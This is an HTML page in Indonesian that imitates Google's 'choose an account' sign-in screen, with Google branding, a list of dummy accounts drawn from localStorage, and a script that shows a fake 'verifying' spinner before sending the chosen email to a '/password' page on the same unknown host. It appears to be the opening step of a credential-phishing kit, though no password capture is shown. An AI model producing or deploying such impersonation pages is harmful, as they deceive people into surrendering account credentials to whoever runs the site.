<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Masuk - Akun Google</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Roboto, 'Helvetica Neue', Arial, sans-serif; }
        body { background: #202124; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 448px; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,.3); }
        .header { display: flex; align-items: center; gap: 16px; padding: 16px 24px; border-bottom: 1px solid #dadce0; }
        .header .logo { display: flex; align-items: center; gap: 4px; }
        .header .logo svg { width: 74px; height: 24px; }
        .header .text { font-size: 14px; color: #202124; }
        .body { padding: 24px; }
        .title { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 4px; }
        .subtitle { font-size: 14px; color: #5f6368; margin-bottom: 24px; }
        .account-list { display: flex; flex-direction: column; gap: 12px; }
        .account {
            display: flex; align-items: center; gap: 16px; padding: 12px;
            border: 1px solid #dadce0; border-radius: 8px; cursor: pointer;
            transition: background .2s; text-decoration: none; color: inherit;
        }
        .account:hover { background: #f6f9fe; border-color: #1a73e8; }
        .avatar {
            width: 40px; height: 40px; border-radius: 50%; display: flex;
            align-items: center; justify-content: center; font-size: 18px;
            font-weight: 500; color: #fff; flex-shrink: 0;
        }
        .av1 { background: #1a73e8; }
        .av2 { background: #ea4335; }
        .av3 { background: #34a853; }
        .av4 { background: #fbbc04; color: #202124; }
        .acc-info { display: flex; flex-direction: column; }
        .acc-name { font-size: 14px; font-weight: 500; color: #202124; }
        .acc-email { font-size: 12px; color: #5f6368; }
        .add-account {
            display: flex; align-items: center; gap: 16px; padding: 12px;
            border: 1px solid #dadce0; border-radius: 8px; cursor: pointer;
            transition: background .2s;
        }
        .add-account:hover { background: #f6f9fe; }
        .add-icon {
            width: 40px; height: 40px; border-radius: 50%; border: 2px dashed #5f6368;
            display: flex; align-items: center; justify-content: center;
            font-size: 24px; color: #5f6368; flex-shrink: 0;
        }
        .footer { padding: 16px 24px; border-top: 1px solid #dadce0; display: flex; justify-content: space-between; }
        .footer a { font-size: 12px; color: #5f6368; text-decoration: none; }
        .loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,.5); z-index: 999; justify-content: center; align-items: center; }
        .loading-box { background: #fff; border-radius: 12px; padding: 32px 48px; text-align: center; }
        .spinner { width: 32px; height: 32px; border: 3px solid #dadce0; border-top-color: #1a73e8; border-radius: 50%; animation: spin .8s linear infinite; margin: 0 auto 16px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loading-text { font-size: 14px; color: #202124; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.24 8.19v2.46h5.92c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.58 1.8-3.5 0-6.22-2.88-6.22-6.44S5.74 2.67 9.24 2.67c2.12 0 3.63.83 4.77 1.92l1.68-1.68C14.34 1.5 12.08.4 9.24.4 4.43.4.46 4.38.46 9.11s3.97 8.71 8.78 8.71c4.48 0 7.52-3.15 7.52-7.6 0-.52-.05-1-.13-1.43H9.24z" fill="#4285F4"/><path d="M25.54 16.72V1.78h-2.04v14.94h2.04z" fill="#34A853"/><path d="M33.07 5.46c-1.47 0-2.63.82-3.18 2.05h-.04V5.72h-1.93v11h2.08v-5.75c0-1.86.74-2.85 2.15-2.85.3 0 .6.03.88.09V5.51a3.9 3.9 0 00-.96-.05z" fill="#EA4335"/><path d="M43.04 11.18c0-3.3-2.2-5.73-5.44-5.73-3.25 0-5.75 2.43-5.75 5.73 0 3.27 2.47 5.72 5.75 5.72 1.63 0 3.07-.56 4.1-1.67l-1.44-1.1c-.68.79-1.55 1.22-2.66 1.22-1.74 0-2.93-1.08-3.13-2.56h7.57v-.61zm-7.44-.92c.17-1.3 1.2-2.28 2.56-2.28 1.36 0 2.38.98 2.56 2.28h-5.12z" fill="#4285F4"/><path d="M53.18 16.72V.4h-2.04v16.32h2.04z" fill="#34A853"/><path d="M63.46 11.25c0-3.24-2.24-5.8-5.43-5.8s-5.7 2.5-5.7 5.73c0 3.3 2.3 5.72 5.76 5.72a5.26 5.26 0 004.1-1.67l-1.43-1.1c-.68.8-1.6 1.22-2.67 1.22-1.68 0-2.87-1.09-3.12-2.56h7.56v-.54zm-7.5-.92c.2-1.3 1.25-2.28 2.63-2.28 1.38 0 2.48 1 2.63 2.28h-5.25z" fill="#EA4335"/><path d="M74.5 16.72l-3.08-7.59-3.15 7.59h-2.23l4.27-9.94-2.48-5.55h2.2l6.87 15.49h-2.4z" fill="#34A853"/></svg>
            </div>
            <div class="text">Google</div>
        </div>
        <div class="body">
            <h1 class="title">Pilih akun</h1>
            <p class="subtitle">untuk melanjutkan ke Google</p>
            <div class="account-list" id="accountList">
                <!-- Diisi JavaScript -->
            </div>
            <div class="add-account" style="margin-top:12px;">
                <div class="add-icon">+</div>
                <div class="acc-info">
                    <span class="acc-name">Gunakan akun lain</span>
                </div>
            </div>
        </div>
        <div class="footer">
            <a href="#">Bahasa Indonesia</a>
            <a href="#">Bantuan</a>
        </div>
    </div>

    <div class="loading" id="loading">
        <div class="loading-box">
            <div class="spinner"></div>
            <div class="loading-text">Memverifikasi...</div>
        </div>
    </div>

    <script>
        // Ambil email dari localStorage (simulasi akun tersimpan)
        var saved = localStorage.getItem('ga_saved');
        if (!saved) {
            // Dummy account buat demo
            saved = JSON.stringify([
                {name:"Andi Pratama", email:"andipratama88@gmail.com", av:"A"},
                {name:"Budi Santoso", email:"budisantoso12@gmail.com", av:"B"},
                {name:"Citra Dewi", email:"citra.dewi@gmail.com", av:"C"}
            ]);
            localStorage.setItem('ga_saved', saved);
        }
        var accounts = JSON.parse(saved);
        var list = document.getElementById('accountList');
        var colors = ['av1','av2','av3','av4'];
        accounts.forEach(function(acc, i){
            var a = document.createElement('a');
            a.className = 'account';
            a.href = 'javascript:void(0)';
            a.onclick = function(){
                document.getElementById('loading').style.display = 'flex';
                localStorage.setItem('ga_email', acc.email);
                setTimeout(function(){
                    window.location.href = '/password?email=' + encodeURIComponent(acc.email);
                }, 2200);
            };
            a.innerHTML = '<div class="avatar '+colors[i%4]+'">'+acc.av+'</div><div class="acc-info"><span class="acc-name">'+acc.name+'</span><span class="acc-email">'+acc.email+'</span></div>';
            list.appendChild(a);
        });
    </script>
</body>
</html>
